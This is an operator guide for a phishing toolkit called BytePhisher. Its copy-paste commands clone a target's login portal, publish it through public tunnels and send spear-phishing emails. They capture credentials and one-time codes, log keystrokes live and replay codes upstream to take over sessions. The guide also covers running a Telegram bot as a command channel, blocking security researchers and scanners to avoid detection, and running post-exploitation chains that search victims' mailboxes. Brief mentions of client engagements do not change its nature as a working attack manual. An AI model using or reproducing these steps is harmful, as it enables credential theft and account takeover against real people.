# BytePhisher — operator guide

Practical walkthrough for running a campaign end to end.
Everything below was executed against this build; commands are copy-paste ready.

## 0. One-time install

```bash
git clone <repo> bytephisher && cd bytephisher
make install            # venv + deps + 670 templates
./.venv/bin/python bytephisher.py --list | head
```

## 1. Pick a template

```bash
./.venv/bin/python bytephisher.py --list           # numbered 1..670
./.venv/bin/python bytephisher.py -o 3             # by index
./.venv/bin/python bytephisher.py -o google        # by slug
```

Custom page (the target's real SSO portal, so the clone is faithful):

```bash
./.venv/bin/python tools/import_site.py --url https://sso.client.example/login \
        --name "Client SSO" --slug client-sso
# -> imports the markup, absolutises assets, points forms at the capture handler,
#    extracts field names, generates an OTP page, registers a new template index
```

## 2. Decide how it is exposed

| Mode | Flag | When |
|---|---|---|
| Local only | `-m test` | dry runs, screenshots, internal demo |
| Cloudflare quick tunnel | `-t cloudflared` | fastest public HTTPS link (auto-downloads the binary) |
| localhost.run | `-t localhost_run` | no account, ssh only |
| bore | `-t bore` | plain HTTP fallback, auto-downloads the binary |
| all of them | `-t all` | prints every link that came up; dead services are reported, not hidden |

```bash
./.venv/bin/python bytephisher.py -o google -t cloudflared --geo ipapi --otp
```

A real run prints something like:

```
[bytephisher] template : Google
[bytephisher] server up on 0.0.0.0:8080
[bytephisher] public URLs:
   cloudflared    https://<random>.trycloudflare.com
```

## 3. Extra delivery channels

```bash

# spear-phishing email with the live link (SMTP from config/config.yaml)
... --mailto target@client.example --mail-template security_alert

# instant pings for every capture
... --telegram "BOT_TOKEN:CHAT_ID" --webhook https://discord.com/api/webhooks/...
```

## 4. Campaign hygiene

* `--campaign q3-payroll` tags every capture, so several campaigns can share one
  database and still report separately.
* `--rotate google,instagram` serves a random template per request (A/B testing
  which lure converts).
* Risk scoring labels scanners and bots automatically — you do not need to
  throw their rows away, the report separates "credential pairs" from
  "credible (low risk) credential pairs".

## 5. Watch it live

```bash
# rich dashboard in the terminal (default when stdout is a TTY)
./.venv/bin/python bytephisher.py -o google -t cloudflared

# plain refresher for logs / systemd / tmux capture
./.venv/bin/python bytephisher.py -o google -t cloudflared --no-tui

# remote/mobile: Flask dashboard + JSON API
./.venv/bin/python bytephisher.py -o google -t cloudflared --web-dashboard --web-port 8090
curl -s localhost:8090/api/stats
curl -s 'localhost:8090/api/captures?limit=5&campaign=q3-payroll'
```

## 5b. Read the device dump

Every visitor's browser reports its full profile on page open, before any
submit:

```bash
./.venv/bin/python bytephisher.py --intel-list            # who, with bot/VPN scores
./.venv/bin/python bytephisher.py --intel-dump latest     # full profile
./.venv/bin/python bytephisher.py --intel-export data/devices.json
```

The dump is the same data the capture store holds, so it lands in the JSON
export (`devices`) and in the alerts alongside credentials.

## 5c. Drive the campaign from the chat

```bash
./.venv/bin/python bytephisher.py --proxy --upstream login.example.com \
    --telegram "TOKEN:CHAT_ID" --telegram-c2
```

The bot becomes a control channel. Everything below happens in the chat:

```text
/stats              captures, credentials (and credible), visitors, sessions
/sessions           newest sessions with state, geo and credential names
/session abc123     credentials, tokens, cookies, timeline
/live abc123        what is being typed, latest value per field
/otp abc123         the input seen, in order, with timings
/takeover abc123    run the session's takeover task
/lures              which lure was opened, how often, converted
/block 1.2.3.4      refuse that address from now on
/blockip abc123     refuse the address recorded on a session
/unblock 1.2.3.4    undo it
/chains             list the post-exploitation chains
/chain <sid> [name] run a chain against a captured session
/help               the list above
```

Alerts arrive with buttons: **Takeover**, **Live**, **Session**, **Block IP**
(and **Show codes** on an OTP alert), so the follow-up is a tap.

A streamed one-time code does not need the operator at all: if the session has a
pending credential POST, the proxy replays it upstream with the code and the
session is captured the moment the site accepts it. The alert then carries the
cookie jar and the `--session <sid>` hint.

## 5d. Keep the scanners out

```bash
./.venv/bin/python bytephisher.py --block-researchers     # built-in lists
./.venv/bin/python bytephisher.py --blocklist-file my-list.txt
./.venv/bin/python bytephisher.py --hook-path /assets/v2/x7f3
```

`--block-researchers` refuses security vendors, cloud/hosting ranges, commercial
VPNs and Tor, scanner user agents and the published scanning ranges. The refusal
is recorded with the match (`known scanning range (censys, 162.142.125.0/24)`), so
a false positive is diagnosable. A scanner that does get through receives the
decoy: the upstream page, with no collector and no session cookie of ours.

`--hook-path` moves the collector and hook routes and the injected tag together —
one value, so the page and the routes cannot disagree.

## 5e. Use the session (chains)

```bash
./.venv/bin/python bytephisher.py --chains
./.venv/bin/python bytephisher.py --run-chain <sid>:full --chain-json out.json
```

A chain drives a real browser against the captured session and reports per task
(see [CONTROL.md](OPERATIONS.md)). The keyword hunt turns the mailbox into findings
with the line each term came from.

## 5f. Housekeeping

```bash
./.venv/bin/python bytephisher.py --keep-days 7 --sessions   # prune old live input
./.venv/bin/python bytephisher.py --live-purge <sid>         # drop one session's stream
```

Every keystroke beacon is a row in `live_input`, so a long campaign accumulates
them; `--keep-days` runs whenever the store is opened, which makes it usable as a
cleanup command.

## 6. Take the data out

```bash
./.venv/bin/python bytephisher.py --export data/captures.csv      # CSV, risk column included
./.venv/bin/python bytephisher.py --export data/captures.json --campaign q3-payroll
./.venv/bin/python bytephisher.py --reuse                          # credential-reuse findings
```

The JSON export carries the full machine-readable dump (stats, campaigns and
every capture with its risk score and reasons); anything not ending in `.json`
is written as CSV. Both keep the `campaign`, `risk` and `risk_reasons` columns,
so triage happens on the raw rows.

## 7. Shut down cleanly

`Ctrl+C` prints the session summary and terminates every tunneler it started:

```
  runtime            : 12m 4s
  total captures     : 37
  credential captures: 11
  unique visitors    : 64
  public urls: cloudflared https://<random>.trycloudflare.com
  tunnels stopped    : 1
```

## 8. Verify the build yourself

```bash
make test         # full suite incl. live tunnels, SMTP, public-URL round trips
make test-fast    # everything that does not need the internet
make probe        # which tunnelers actually work right now
```

## Operational cautions
* Tunnel URLs are public. Treat the link as you would a live credential-
  harvesting page: short windows, named campaigns, scoped audiences.
* Captures land in SQLite with IP, geo, ISP, UA, device and risk. That is
  personal data — delete `data/` when the engagement ends unless the client
  contract says otherwise.
